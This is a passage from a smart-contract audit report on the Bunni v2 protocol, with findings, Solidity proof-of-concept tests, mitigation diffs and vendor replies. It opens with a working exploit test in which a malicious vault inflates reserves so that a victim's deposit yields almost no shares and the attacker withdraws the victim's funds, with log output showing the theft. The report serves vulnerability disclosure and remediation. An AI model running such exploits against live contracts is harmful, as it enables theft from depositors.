    PERMIT2.approve(address(token0), address(hub), type(uint160).max, type(uint48).max);
    PERMIT2.approve(address(token1), address(hub), type(uint160).max, type(uint48).max);
    vm.stopPrank();

    // mint tokens
    _mint(key.currency0, firstDepositor, depositAmount0 * 100);
    _mint(key.currency1, firstDepositor, depositAmount1 * 100);

    // deposit tokens
    IBunniHub.DepositParams memory depositParams = IBunniHub.DepositParams({
        poolKey: key,
        amount0Desired: depositAmount0,
        amount1Desired: depositAmount1,
        amount0Min: 0,
        amount1Min: 0,
        deadline: block.timestamp,
        recipient: firstDepositor,
        refundRecipient: firstDepositor,
        vaultFee0: 0,
        vaultFee1: 0,
        referrer: address(0)
    });

    vm.startPrank(firstDepositor);
    (uint256 sharesFirstDepositor, uint256 firstDepositorAmount0In, uint256 firstDepositorAmount1In) = hub.deposit(depositParams);
    console.log("Amount 0 deposited by first depositor", firstDepositorAmount0In);
    console.log("Amount 1 deposited by first depositor", firstDepositorAmount1In);
    maliciousVaultToken0.setMultiplier(1e10);
    maliciousVaultToken1.setMultiplier(1e10);
    vm.stopPrank();


    depositAmount0 = 100e18;
    depositAmount1 = 100e18;
    address victim = makeAddr("victim");
    vm.startPrank(victim);
    token0.approve(address(PERMIT2), type(uint256).max);
    token1.approve(address(PERMIT2), type(uint256).max);
    PERMIT2.approve(address(token0), address(hub), type(uint160).max, type(uint48).max);
    PERMIT2.approve(address(token1), address(hub), type(uint160).max, type(uint48).max);
    vm.stopPrank();

    // mint tokens
    _mint(key.currency0, victim, depositAmount0);
    _mint(key.currency1, victim, depositAmount1);

    // deposit tokens
    depositParams = IBunniHub.DepositParams({
        poolKey: key,
        amount0Desired: depositAmount0,
        amount1Desired: depositAmount1,
        amount0Min: depositAmount0 * 99 / 100,        // victim uses a slippage protection of 99%
        amount1Min: depositAmount0 * 99 / 100,        // victim uses a slippage protection of 99%
        deadline: block.timestamp,
        recipient: victim,
        refundRecipient: victim,
        vaultFee0: 0,
        vaultFee1: 0,
        referrer: address(0)
    });

    vm.prank(victim);
    (uint256 sharesVictim, uint256 victimAmount0In, uint256 victimAmount1In) = hub.deposit(depositParams);
    console.log("Amount 0 deposited by victim", victimAmount0In);
    console.log("Amount 1 deposited by victim", victimAmount1In);

    IBunniHub.WithdrawParams memory withdrawParams = IBunniHub.WithdrawParams({
        poolKey: key,
        recipient: firstDepositor,
        shares: sharesFirstDepositor,
        amount0Min: 0,
        amount1Min: 0,
        deadline: block.timestamp,
        useQueuedWithdrawal: false
    });
    vm.prank(firstDepositor);
    (uint256 withdrawAmount0FirstDepositor, uint256 withdrawAmount1FirstDepositor) = hub.withdraw(withdrawParams);
    console.log("Amount 0 withdrawn by first depositor", withdrawAmount0FirstDepositor);
    console.log("Amount 1 withdrawn by first depositor", withdrawAmount1FirstDepositor);

    withdrawParams = IBunniHub.WithdrawParams({
        poolKey: key,
        recipient: victim,
        shares: sharesVictim,
        amount0Min: 0,
        amount1Min: 0,
        deadline: block.timestamp,
        useQueuedWithdrawal: false
    });
    vm.prank(victim);
    (uint256 withdrawAmount0Victim, uint256 withdrawAmount1Victim) = hub.withdraw(withdrawParams);
    console.log("Amount 0 withdrawn by victim", withdrawAmount0Victim);
    console.log("Amount 1 withdrawn by victim", withdrawAmount1Victim);
}
```

In this PoC, a `UniformDistribution` has been used to set the token ratio 1:1 to enable the token amounts to be seen more clearly. It can be observed that immediately before the victim deposits, the first depositor sets up a significant increase in the vault reserves such that the `BunniHub` believes it has many more reserves from both tokens. The `BunniHub` computes the amount of shares to mint for the victim considering these huge token balances. The result is that the victim receives a very small amount of shares. Afterwards, the attacker will be able to withdraw almost all the amounts deposited by the victim due to having far more shares.

Output:
```bash
Ran 1 test for test/BunniHub.t.sol:BunniHubTest
[PASS] test_SlippageAttack() (gas: 5990352)
Logs:
  Amount 0 deposited by first depositor     999999999999999999
  Amount 1 deposited by first depositor     999999999999999999
  Amount 0 deposited by victim           100000000000000000000
  Amount 1 deposited by victim           100000000000000000000
  Amount 0 withdrawn by first depositor  100999897877778912580
  Amount 1 withdrawn by first depositor  100999897877778912580
  Amount 0 withdrawn by victim                   1122222209640
  Amount 1 withdrawn by victim                   1122222209640

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 885.72ms (5.18ms CPU time)
```

**Recommended Mitigation:** Allow the depositor to provide a minimum amount of shares to mint when executing the deposit. As shown in the PoC, since the token ratio did not change, the slippage protection was not effective.

```diff
    struct DepositParams {
        PoolKey poolKey;
        address recipient;
        address refundRecipient;
        uint256 amount0Desired;
        uint256 amount1Desired;
        uint256 amount0Min;
        uint256 amount1Min;
++      uint256 sharesMin;
        uint256 vaultFee0;
        uint256 vaultFee1;
        uint256 deadline;
        address referrer;
    }

    function deposit(HubStorage storage s, Env calldata env, IBunniHub.DepositParams calldata params)
        external
        returns (uint256 shares, uint256 amount0, uint256 amount1)
    {
        ...

--      // check slippage
--      if (amount0 < params.amount0Min || amount1 < params.amount1Min) {
--          revert BunniHub__SlippageTooHigh();
--      }

        // mint shares using actual token amounts
        shares = _mintShares(
            msgSender,
            state.bunniToken,
            params.recipient,
            amount0,
            depositReturnData.balance0,
            amount1,
            depositReturnData.balance1,
            params.referrer
        );

++      // check slippage
++      if (amount0 < params.amount0Min || amount1 < params.amount1Min || shares < params.sharesMin) {
++          revert BunniHub__SlippageTooHigh();
++      }
        ...
    }
```

**Bacon Labs:** Acknowledged, we wont make any changes since as the report suggests the user needs to knowingly deposit into a pool with a malicious vault which is out-of-scope.

**Cyfrin:** Acknowledged.


### Hooklet validation is recommended upon deploying new Bunni tokens

**Description:** Uniswap V4 performs some validation on the hook address to ensure that a valid contract has been provided:
```solidity
function initialize(PoolKey memory key, uint160 sqrtPriceX96) external noDelegateCall returns (int24 tick) {
    ...
    if (!key.hooks.isValidHookAddress(key.fee)) Hooks.HookAddressNotValid.selector.revertWith(address(key.hooks));
    ...
}

function isValidHookAddress(IHooks self, uint24 fee) internal pure returns (bool) {
    // The hook can only have a flag to return a hook delta on an action if it also has the corresponding action flag
    if (!self.hasPermission(BEFORE_SWAP_FLAG) && self.hasPermission(BEFORE_SWAP_RETURNS_DELTA_FLAG)) return false;
    if (!self.hasPermission(AFTER_SWAP_FLAG) && self.hasPermission(AFTER_SWAP_RETURNS_DELTA_FLAG)) return false;
    if (!self.hasPermission(AFTER_ADD_LIQUIDITY_FLAG) && self.hasPermission(AFTER_ADD_LIQUIDITY_RETURNS_DELTA_FLAG))
    {
        return false;
    }
    if (
        !self.hasPermission(AFTER_REMOVE_LIQUIDITY_FLAG)
            && self.hasPermission(AFTER_REMOVE_LIQUIDITY_RETURNS_DELTA_FLAG)
    ) return false;

    // If there is no hook contract set, then fee cannot be dynamic
    // If a hook contract is set, it must have at least 1 flag set, or have a dynamic fee
    return address(self) == address(0)
        ? !fee.isDynamicFee()
        : (uint160(address(self)) & ALL_HOOK_MASK > 0 || fee.isDynamicFee());
}
```
Regarding the hooklet, it would be best practice to also validate the permissions for the `BEFORE_SWAP_FLAG`.

**Recommended Mitigation:**
```solidity
function deployBunniToken(HubStorage storage s, Env calldata env, IBunniHub.DeployBunniTokenParams calldata params)
    external
    returns (IBunniToken token, PoolKey memory key)
{
    ...
    if (!params.hooklet.isValidHookletAddress()) revert();
    ...
}

function isValidHookletAddress(IHooklet self) internal pure returns (bool isValid) {
    isValid = true;

    // The hooklet can only have a flag to override the fee and price if it also has the corresponding action flag
    if (!self.hasPermission(BEFORE_SWAP_FLAG) && (self.hasPermission(BEFORE_SWAP_OVERRIDE_FEE_FLAG) || self.hasPermission(BEFORE_SWAP_OVERRIDE_PRICE_FLAG))) return false;
}
```

**Bacon Labs:** Acknowledged, well keep it as is because nonsensical flag combinations (such as not setting `BEFORE_SWAP_FLAG` but setting `BEFORE_SWAP_OVERRIDE_FEE_FLAG`) dont result in undefined behavior.

**Cyfrin:** Acknowledged.


### `BuyTheDipGeometricDistribution` parameter encoding documentation is inconsistent

**Description:** The `BuyTheDipGeometricDistribution` [parameter encoding documentation](https://docs.bunni.xyz/docs/v2/technical/ldf/params/#parameter-encoding-5) specified an unused byte between alpha values; however, this is inconsistent with the actual implementation of `LibBuyTheDipGeometricDistribution::decodeParams` and should be corrected:

```solidity
function decodeParams(bytes32 ldfParams)
    internal
    pure
    returns (
        int24 minTick,
        int24 length,
        uint256 alphaX96,
        uint256 altAlphaX96,
        int24 altThreshold,
        bool altThresholdDirection
    )
{
    // static minTick set in params
    // | shiftMode - 1 byte | minTick - 3 bytes | length - 2 bytes | alpha - 4 bytes | altAlpha - 4 bytes | altThreshold - 3 bytes | altThresholdDirection - 1 byte |
    minTick = int24(uint24(bytes3(ldfParams << 8))); // must be aligned to tickSpacing
    length = int24(int16(uint16(bytes2(ldfParams << 32))));
    uint256 alpha = uint32(bytes4(ldfParams << 48));
    alphaX96 = alpha.mulDiv(Q96, ALPHA_BASE);
    uint256 altAlpha = uint32(bytes4(ldfParams << 80));
    altAlphaX96 = altAlpha.mulDiv(Q96, ALPHA_BASE);
    altThreshold = int24(uint24(bytes3(ldfParams << 112)));
    altThresholdDirection = uint8(bytes1(ldfParams << 136)) != 0;
}
```

**Bacon Labs:** Acknowledged, this has been fixed in the docs.

**Cyfrin:** Acknowledged.


### Typographical error in `BunniHookLogic::beforeSwap` should be corrected

**Description:** While it does not cause any issues, there is a typographical error in the declaration of the `hookHandleSwapOutoutAmount` within `BunniHookLogic::beforeSwap`. This should instead be `hookHandleSwapOutputAmount` along with all subsequent usage.

**Bacon Labs:** Fixed in [PR \#125](https://github.com/timeless-fi/bunni-v2/pull/125).

**Cyfrin:** Verified, the error has been corrected.


### Unchecked queue withdrawal timestamp logic is implemented incorrectly

**Description:** Unchecked math is used within `BunniHubLogic::queueWithdraw` to wrap around if the sum of the block timestamp with `WITHDRAW_DELAY` exceeds the maximum `uint56`:

```solidity
    // update queued withdrawal
    // use unchecked to get unlockTimestamp to overflow back to 0 if overflow occurs
    // which is fine since we only care about relative time
    uint56 newUnlockTimestamp;
    unchecked {
@>      newUnlockTimestamp = uint56(block.timestamp) + WITHDRAW_DELAY;
    }
    if (queued.shareAmount != 0) {
        // requeue expired queued withdrawal
@>      if (queued.unlockTimestamp + WITHDRAW_GRACE_PERIOD >= block.timestamp) {
            revert BunniHub__NoExpiredWithdrawal();
        }
        s.queuedWithdrawals[id][msgSender].unlockTimestamp = newUnlockTimestamp;
    } else {
        // create new queued withdrawal
        if (params.shares == 0) revert BunniHub__ZeroInput();
        s.queuedWithdrawals[id][msgSender] =
            QueuedWithdrawal({shareAmount: params.shares, unlockTimestamp: newUnlockTimestamp});
    }
```

This yields a `newUnlockTimestamp` that is modulo the max `uint56`; however, note the addition of `WITHDRAW_GRACE_PERIOD` to the unlock timestamp of an existing queued withdrawal that is also present in `BunniHubLogic::withdraw`:

```solidity
    if (params.useQueuedWithdrawal) {
        // use queued withdrawal
        // need to withdraw the full queued amount
        QueuedWithdrawal memory queued = s.queuedWithdrawals[poolId][msgSender];
        if (queued.shareAmount == 0 || queued.unlockTimestamp == 0) revert BunniHub__QueuedWithdrawalNonexistent();
@>      if (block.timestamp < queued.unlockTimestamp) revert BunniHub__QueuedWithdrawalNotReady();
@>      if (queued.unlockTimestamp + WITHDRAW_GRACE_PERIOD < block.timestamp) revert BunniHub__GracePeriodExpired();
        shares = queued.shareAmount;
        s.queuedWithdrawals[poolId][msgSender].shareAmount = 0; // don't delete the struct to save gas later
        state.bunniToken.burn(address(this), shares); // BunniTokens were deposited to address(this) earlier with queueWithdraw()
    }
```

This logic is not implemented correctly and has a couple of implications in various scenarios:
* If the unlock timestamp for a given queued withdrawal with the `WITHDRAW_DELAY` does not overflow, but with the addition of the `WITHDRAW_GRACE_PERIOD` it does, then queued withdrawals will revert due to overflowing `uint56` outside of the unchecked block and it will not be possible to re-queue expired withdrawals for the same reasoning.
* If the unlock timestamp for a given queued withdrawal with the `WITHDRAW_DELAY` overflows and wraps around, it is possible to immediately re-queue an expired withdrawal, since by comparison the block timestamp in `uint256` will be a lot larger than the unlock timestamp the `WITHDRAW_GRACE_PERIOD` applied; however, it will not be possible to execute such a withdrawal (even without replacement) since the block timestamp will always be significantly larger after wrapping around.

**Impact:** While it is unlikely `block.timestamp` will reach close to overflowing a `uint56` within the lifetime of the Sun, the intended unchecked logic is implemented incorrectly and would prevent queued withdrawals from executing correctly. This could be especially problematic if the width of the data type were reduced assuming no issues are present.

**Proof of Concept:** The following tests can be run from within `test/BunniHub.t.sol`:
```solidity
function test_queueWithdrawPoC1() public {
    uint256 depositAmount0 = 1 ether;
    uint256 depositAmount1 = 1 ether;
    (IBunniToken bunniToken, PoolKey memory key) = _deployPoolAndInitLiquidity();

    // make deposit
    (uint256 shares,,) = _makeDepositWithFee({
        key_: key,
        depositAmount0: depositAmount0,
        depositAmount1: depositAmount1,
        depositor: address(this),
        vaultFee0: 0,
        vaultFee1: 0,
        snapLabel: ""
    });

    // bid in am-AMM auction
    PoolId id = key.toId();
    bunniToken.approve(address(bunniHook), type(uint256).max);
    uint128 minRent = uint128(bunniToken.totalSupply() * MIN_RENT_MULTIPLIER / 1e18);
    uint128 rentDeposit = minRent * 2 days;
    bunniHook.bid(id, address(this), bytes6(abi.encodePacked(uint24(1e3), uint24(2e3))), minRent * 2, rentDeposit);
    shares -= rentDeposit;

    // wait until address(this) is the manager
    skipBlocks(K);
    assertEq(bunniHook.getTopBid(id).manager, address(this), "not manager yet");

    vm.warp(type(uint56).max - 1 minutes);

    // queue withdraw
    bunniToken.approve(address(hub), type(uint256).max);
    hub.queueWithdraw(IBunniHub.QueueWithdrawParams({poolKey: key, shares: shares.toUint200()}));
    assertEqDecimal(bunniToken.balanceOf(address(hub)), shares, DECIMALS, "didn't take shares");

    // wait 1 minute
    skip(1 minutes);

    // withdraw
    IBunniHub.WithdrawParams memory withdrawParams = IBunniHub.WithdrawParams({
        poolKey: key,
        recipient: address(this),
        shares: shares,
        amount0Min: 0,
        amount1Min: 0,
        deadline: block.timestamp,
        useQueuedWithdrawal: true
    });
    vm.expectRevert();
    hub.withdraw(withdrawParams);
}

function test_queueWithdrawPoC2() public {
    uint256 depositAmount0 = 1 ether;
    uint256 depositAmount1 = 1 ether;
    (IBunniToken bunniToken, PoolKey memory key) = _deployPoolAndInitLiquidity();

    // make deposit
    (uint256 shares,,) = _makeDepositWithFee({
        key_: key,
        depositAmount0: depositAmount0,
        depositAmount1: depositAmount1,
        depositor: address(this),
        vaultFee0: 0,
        vaultFee1: 0,
        snapLabel: ""
    });

    // bid in am-AMM auction
    PoolId id = key.toId();
    bunniToken.approve(address(bunniHook), type(uint256).max);
    uint128 minRent = uint128(bunniToken.totalSupply() * MIN_RENT_MULTIPLIER / 1e18);
    uint128 rentDeposit = minRent * 2 days;
    bunniHook.bid(id, address(this), bytes6(abi.encodePacked(uint24(1e3), uint24(2e3))), minRent * 2, rentDeposit);
    shares -= rentDeposit;

    // wait until address(this) is the manager
    skipBlocks(K);
    assertEq(bunniHook.getTopBid(id).manager, address(this), "not manager yet");

    vm.warp(type(uint56).max);

    // queue withdraw
    bunniToken.approve(address(hub), type(uint256).max);
    hub.queueWithdraw(IBunniHub.QueueWithdrawParams({poolKey: key, shares: shares.toUint200()}));
    assertEqDecimal(bunniToken.balanceOf(address(hub)), shares, DECIMALS, "didn't take shares");

    // wait 1 minute
    skip(1 minutes);

    // re-queue before expiry
    hub.queueWithdraw(IBunniHub.QueueWithdrawParams({poolKey: key, shares: shares.toUint200()}));

    // withdraw
    IBunniHub.WithdrawParams memory withdrawParams = IBunniHub.WithdrawParams({
        poolKey: key,
        recipient: address(this),
        shares: shares,
        amount0Min: 0,
        amount1Min: 0,
        deadline: block.timestamp,
        useQueuedWithdrawal: true
    });
    vm.expectRevert();
    hub.withdraw(withdrawParams);
}
```

**Recommended Mitigation:** Unsafely downcast all other usage of `block.timestamp` to `uint56` such that it is allowed to silently overflow when compared with unlock timestamps computed in the same way.

**Bacon Labs:** Fixed in [PR \#126](https://github.com/timeless-fi/bunni-v2/pull/126).

**Cyfrin:** Verified, `uint56` overflows are now handled during queued withdrawal.


### Inconsistent rounding directions should be clarified and standardized

**Description:** While there has been some effort made toward systematic rounding, there remain a number of instances where the handling and/or direction of rounding is inconsistent. The first example is within `LibCarpetedGeometricDistribution::liquidityDensityX96` which rounds the returned carpet liquidity up:

```solidity
return carpetLiquidity.divUp(uint24(numRoundedTicksCarpeted));
```

Meanwhile, `LibCarpetedDoubleGeometricDistribution::liquidityDensityX96` rounds down:

```solidity
return carpetLiquidity / uint24(numRoundedTicksCarpeted);
```

Additionally, a configuration was identified that allowed the addition of density contributions from all ricks to exceed `Q96`. Since it is only the current rick liquidity that is used in computations, this does not appear to be a problem as it will simply account a negligibly small amount of additional liquidity density.

**Proof of Concept:** The following test can be run from within `GeometricDistribution.t.sol`:

```solidity
function test_liquidityDensity_sumUpToOneGeometricDistribution(int24 tickSpacing, int24 minTick, int24 length, uint256 alpha)
    external
    virtual
{
    alpha = bound(alpha, MIN_ALPHA, MAX_ALPHA);
    vm.assume(alpha != 1e8); // 1e8 is a special case that causes overflow
    tickSpacing = int24(bound(tickSpacing, MIN_TICK_SPACING, MAX_TICK_SPACING));
    (int24 minUsableTick, int24 maxUsableTick) =
        (TickMath.minUsableTick(tickSpacing), TickMath.maxUsableTick(tickSpacing));
    minTick = roundTickSingle(int24(bound(minTick, minUsableTick, maxUsableTick - 2 * tickSpacing)), tickSpacing);
    length = int24(bound(length, 1, (maxUsableTick - minTick) / tickSpacing - 1));

    console2.log("alpha", alpha);
    console2.log("tickSpacing", tickSpacing);
    console2.log("minTick", minTick);
    console2.log("length", length);

    PoolKey memory key;
    key.tickSpacing = tickSpacing;
    bytes32 ldfParams = bytes32(abi.encodePacked(ShiftMode.STATIC, minTick, int16(length), uint32(alpha)));
    vm.assume(ldf.isValidParams(key, 0, ldfParams));


    uint256 cumulativeLiquidityDensity;
    (int24 minTick, int24 maxTick) =
        (TickMath.minUsableTick(tickSpacing), TickMath.maxUsableTick(tickSpacing) - tickSpacing);
    key.tickSpacing = tickSpacing;
    int24 spotPriceTick = 0;
    for (int24 tick = minTick; tick <= maxTick; tick += tickSpacing) {
        (uint256 liquidityDensityX96,,,,) = ldf.query(key, tick, 0, spotPriceTick, ldfParams, LDF_STATE);
        cumulativeLiquidityDensity += liquidityDensityX96;
    }

    console2.log("Cumulative liquidity density", cumulativeLiquidityDensity);
    console2.log("One", FixedPoint96.Q96);
    if(cumulativeLiquidityDensity > FixedPoint96.Q96) console2.log("Extra cumulative liquidity density", cumulativeLiquidityDensity - FixedPoint96.Q96);
    assertTrue(cumulativeLiquidityDensity <= FixedPoint96.Q96);
}
```

**Recommended Mitigation:** Further clarify opaque rounding decisions with inline comments and standardize any inconsistencies such as those noted above.

**Bacon Labs:** Fixed the LibCarpetedDoubleGeometricDistribution rounding issue in [PR \#127](https://github.com/timeless-fi/bunni-v2/pull/127). Agreed that the total density slightly exceeding `Q96` is fine.

**Cyfrin:** Verified, carpet liquidity is now rounded up in`LibCarpetedDoubleGeometricDistribution::liquidityDensityX96`.


### Just in time (JIT) liquidity can be used to inflate rebalance order amounts

**Description:** As reported in the Trail of Bits audit, the addition of JIT liquidity before a swap that would trigger a rebalance order can inflate the amount required fulfil the order beyond that which would typically be within the pool. With the modification to allow Bunni liquidity to be used during fulfilment of rebalance orders, this has implications for both the pool being rebalanced and liquidity from any other pools that are used in this process. Ultimately, this can in certain scenarios require the fulfiller to provide JIT liquidity of their own to carry out the rebalance, resulting in a less profitable fulfilment than expected and potentially DoS'ing withdrawals in other pools. The profitable addition of JIT liquidity by an attacker is however realistically quite unlikely, especially as it is not possible to perform any action after the rebalance order fulfilment during the same transaction since the transient re-entrancy guard will remain locked. Additionally, it is not possible to withdraw the liquidity before the rebalance order is either process or expired (in which case it is recalculated) unless the `withdrawalUnblocked` override is set. Even still, this may result in undesirable behavior such as leaving the pool originally intended to be rebalanced in an unbalanced state and so should be carefully considered before deploying to production.

**Bacon Labs:** Acknowledged. We agree that the issue is unlikely to occur in practice due to both the lack of a profit motive and the lack of a clear impact on the pool operations.

**Cyfrin:** Acknowledged.

\clearpage
## Gas Optimization


### Unnecessary `currency1` native token checks

**Description:** Uniswap currency pairs are sorted by address. If either of the two pool reserve tokens is a native token, specified as `address(0)`, it can only be the `currency0` as `currency1` will always have a greater address. As such, native token validation performed on `currency1` and related logic is not necessary.

**Recommended Mitigation:** The following instances can be removed:

* `BunniHub.sol`:
```diff
    function _depositUnlockCallback(DepositCallbackInputData memory data) internal returns (bytes memory) {
        (address msgSender, PoolKey memory key, uint256 msgValue, uint256 rawAmount0, uint256 rawAmount1) =
            (data.user, data.poolKey, data.msgValue, data.rawAmount0, data.rawAmount1);

        PoolId poolId = key.toId();
        uint256 paid0;
        uint256 paid1;
        if (rawAmount0 != 0) {
            poolManager.sync(key.currency0);

            // transfer tokens to poolManager
            if (key.currency0.isAddressZero()) {
                if (msgValue < rawAmount0) revert BunniHub__MsgValueInsufficient();
                paid0 = poolManager.settle{value: rawAmount0}();
            } else {
                Currency.unwrap(key.currency0).excessivelySafeTransferFrom2(msgSender, address(poolManager), rawAmount0);
                paid0 = poolManager.settle();
            }

            poolManager.mint(address(this), key.currency0.toId(), paid0);
            s.poolState[poolId].rawBalance0 += paid0;
        }
        if (rawAmount1 != 0) {
            poolManager.sync(key.currency1);

            // transfer tokens to poolManager
--          if (key.currency1.isAddressZero()) {
--              if (msgValue < rawAmount1) revert BunniHub__MsgValueInsufficient();
--              paid1 = poolManager.settle{value: rawAmount1}();
--          } else {
                Currency.unwrap(key.currency1).excessivelySafeTransferFrom2(msgSender, address(poolManager), rawAmount1);
                paid1 = poolManager.settle();
--          }

            poolManager.mint(address(this), key.currency1.toId(), paid1);
            s.poolState[poolId].rawBalance1 += paid1;
        }
        return abi.encode(paid0, paid1);
    }
```

 *`BunniHubLogic.sol`:
```diff
    function deposit(HubStorage storage s, Env calldata env, IBunniHub.DepositParams calldata params)
        external
        returns (uint256 shares, uint256 amount0, uint256 amount1)
    {
        address msgSender = LibMulticaller.senderOrSigner();
        PoolId poolId = params.poolKey.toId();
        PoolState memory state = getPoolState(s, poolId);

        /// -----------------------------------------------------------------------
        /// Validation
        /// -----------------------------------------------------------------------

--      if (msg.value != 0 && !params.poolKey.currency0.isAddressZero() && !params.poolKey.currency1.isAddressZero()) {
++      if (msg.value != 0 && !params.poolKey.currency0.isAddressZero()) {
            revert BunniHub__MsgValueNotZeroWhenPoolKeyHasNoNativeToken();
        }
        ...

        // refund excess ETH
        if (params.poolKey.currency0.isAddressZero()) {
            if (address(this).balance != 0) {
                params.refundRecipient.safeTransferETH(
                    FixedPointMathLib.min(address(this).balance, msg.value - amount0Spent)
                );
            }
--      } else if (params.poolKey.currency1.isAddressZero()) {
--          if (address(this).balance != 0) {
--              params.refundRecipient.safeTransferETH(
--                  FixedPointMathLib.min(address(this).balance, msg.value - amount1Spent)
--              );
--          }
        }

        ...
    }
```

**Bacon Labs:** Fixed in [PR \#114](https://github.com/timeless-fi/bunni-v2/pull/114).

**Cyfrin:** Verified, branches corresponding to `key.currency1.isAddressZero()` have been removed.


### Unnecessary stack variable can be removed

**Description:** When returning whether am-AMM is enabled, `BunniHook::_amAmmEnabled` uses a stack variable when it is not necessary and the boolean can instead be returned directly. If better readability is required, the assignment could be made to a named return variable instead.

**Recommended Mitigation:**
```diff
    function _amAmmEnabled(PoolId id) internal view virtual override returns (bool) {
        bytes memory hookParams = hub.hookParams(id);
        bytes32 firstWord;
        /// @solidity memory-safe-assembly
        assembly {
            firstWord := mload(add(hookParams, 32))
        }
--      bool poolEnabled = uint8(bytes1(firstWord << 248)) != 0;
--      return poolEnabled;
++      return uint8(bytes1(firstWord << 248)) != 0;
    }
```

or

```diff
--  function _amAmmEnabled(PoolId id) internal view virtual override returns (bool) {
++  function _amAmmEnabled(PoolId id) internal view virtual override returns (bool poolEnabled) {
        bytes memory hookParams = hub.hookParams(id);
        bytes32 firstWord;
        /// @solidity memory-safe-assembly
        assembly {
            firstWord := mload(add(hookParams, 32))
        }
--      bool poolEnabled = uint8(bytes1(firstWord << 248)) != 0;
--      return poolEnabled;
++      poolEnabled = uint8(bytes1(firstWord << 248)) != 0;
    }
```

**Bacon Labs:** Fixed in [PR \#115](https://github.com/timeless-fi/bunni-v2/pull/115).

**Cyfrin:** Verified, the `BunniHook::_amAmmEnabled` boolean is now returned directly.


### Superfluous conditional branches can be combined

**Description:** `BunniHubLogic::queueWithdraw` makes use of comments to demarcate logic into separate sections. When performing state updates, a new queued withdrawal is created when there is no existing queued share amount given by the `else` branch of the conditional logic shown below:

```solidity
function queueWithdraw(HubStorage storage s, IBunniHub.QueueWithdrawParams calldata params) external {
    ...
    if (queued.shareAmount != 0) {
        ...
    } else {
        // create new queued withdrawal
        if (params.shares == 0) revert BunniHub__ZeroInput();
        s.queuedWithdrawals[id][msgSender] =
            QueuedWithdrawal({shareAmount: params.shares, unlockTimestamp: newUnlockTimestamp});
    }

    /// -----------------------------------------------------------------------
    /// External calls
    /// -----------------------------------------------------------------------

    if (queued.shareAmount == 0) {
        // transfer shares from msgSender to address(this)
        bunniToken.transferFrom(msgSender, address(this), params.shares);
    }

    emit IBunniHub.QueueWithdraw(msgSender, id, params.shares);
}
```

While the separate external call section makes the code more readable, this transfer could be executed within the aforementioned `else` block to avoid unnecessary execution of an additional conditional.

**Recommended Mitigation:**
```diff
    } else {
        // create new queued withdrawal
        if (params.shares == 0) revert BunniHub__ZeroInput();
        s.queuedWithdrawals[id][msgSender] =
            QueuedWithdrawal({shareAmount: params.shares, unlockTimestamp: newUnlockTimestamp});
++      // transfer shares from msgSender to address(this)
++      bunniToken.transferFrom(msgSender, address(this), params.shares);
    }

    /// -----------------------------------------------------------------------
    /// External calls
    /// -----------------------------------------------------------------------

--  if (queued.shareAmount == 0) {
--      // transfer shares from msgSender to address(this)
--      bunniToken.transferFrom(msgSender, address(this), params.shares);
--  }
```

**Bacon Labs:** Fixed in [PR \#116](https://github.com/timeless-fi/bunni-v2/pull/116).

**Cyfrin:** Verified, `BunniHubLogic::queueWithdraw` has been simplified to include the Bunni token transfer within the new queued withdrawal conditional branch.


### am-AMM fee validation can be simplified

**Description:** When charging the swap fee, `BunniHookLogic::beforeSwap` checks whether the am-AMM fee should be used by validating whether it is enabled and whether there is an active top bid:

```solidity
        // update am-AMM state
        uint24 amAmmSwapFee;
@>      if (hookParams.amAmmEnabled) {
            bytes6 payload;
            IAmAmm.Bid memory topBid = IAmAmm(address(this)).getTopBidWrite(id);
            (amAmmManager, payload) = (topBid.manager, topBid.payload);
            (uint24 swapFee0For1, uint24 swapFee1For0) = decodeAmAmmPayload(payload);
            amAmmSwapFee = params.zeroForOne ? swapFee0For1 : swapFee1For0;
        }

        // charge swap fee
        // precedence:
        // 1) am-AMM fee
        // 2) hooklet override fee
        // 3) dynamic fee
        (Currency inputToken, Currency outputToken) =
            params.zeroForOne ? (key.currency0, key.currency1) : (key.currency1, key.currency0);
        uint24 swapFee;
        uint256 swapFeeAmount;
@>      useAmAmmFee = hookParams.amAmmEnabled && amAmmManager != address(0);
```

Given that `amAmmManager` is a named return value that is not assigned anywhere else except within the conditional block triggered when am-AMM is enabled, the `useAmAmmFee` assignment can be simplified to checking only that `amAmmManager` is assigned a non-zero address.

**Recommended Mitigation:**
```diff
        // update am-AMM state
        uint24 amAmmSwapFee;
        if (hookParams.amAmmEnabled) {
            bytes6 payload;
            IAmAmm.Bid memory topBid = IAmAmm(address(this)).getTopBidWrite(id);
            (amAmmManager, payload) = (topBid.manager, topBid.payload);
            (uint24 swapFee0For1, uint24 swapFee1For0) = decodeAmAmmPayload(payload);
            amAmmSwapFee = params.zeroForOne ? swapFee0For1 : swapFee1For0;
        }

        // charge swap fee
        // precedence:
        // 1) am-AMM fee
        // 2) hooklet override fee
        // 3) dynamic fee
        (Currency inputToken, Currency outputToken) =
            params.zeroForOne ? (key.currency0, key.currency1) : (key.currency1, key.currency0);
        uint24 swapFee;
        uint256 swapFeeAmount;
--      useAmAmmFee = hookParams.amAmmEnabled && amAmmManager != address(0);
++      useAmAmmFee = amAmmManager != address(0);
```

**Bacon Labs:** Acknowledged. When we tried simplifying `useAmAmmFee` as suggested the gas cost of swaps actually went up by ~50 gas. We do not know why (probably solc optimizer weirdness) but will leave it as is.

**Cyfrin:** Acknowledged.


### Unnecessary conditions can be removed from `LibUniformDistribution` conditionals

**Description:** `LibUniformDistribution::inverseCumulativeAmount0` short circuits if the specified `cumulativeAmount0_` is zero, meaning that the value of this variable is guaranteed to be non-zero in subsequent execution as it is nowhere modified:

```solidity
function inverseCumulativeAmount0(
    uint256 cumulativeAmount0_,
    uint256 totalLiquidity,
    int24 tickSpacing,
    int24 tickLower,
    int24 tickUpper,
    bool isCarpet
) internal pure returns (bool success, int24 roundedTick) {
    // short circuit if cumulativeAmount0_ is 0
    if (cumulativeAmount0_ == 0) return (true, tickUpper);

    ...

    // ensure that roundedTick is not tickUpper when cumulativeAmount0_ is non-zero
    // this can happen if the corresponding cumulative density is too small
    if (roundedTick == tickUpper && cumulativeAmount0_ != 0) {
        return (true, tickUpper - tickSpacing);
    }
}
```

The second condition in the final `if` statement can therefore be removed as this is handled by short-circuit. A similar case exists in `LibUniformDistribution::inverseCumulativeAmount1`.

**Recommended Mitigation:** * `LibUniformDistribution::inverseCumulativeAmount0`:

```diff
    function inverseCumulativeAmount0(
        uint256 cumulativeAmount0_,
        uint256 totalLiquidity,
        int24 tickSpacing,
        int24 tickLower,
        int24 tickUpper,
        bool isCarpet
    ) internal pure returns (bool success, int24 roundedTick) {
        // short circuit if cumulativeAmount0_ is 0
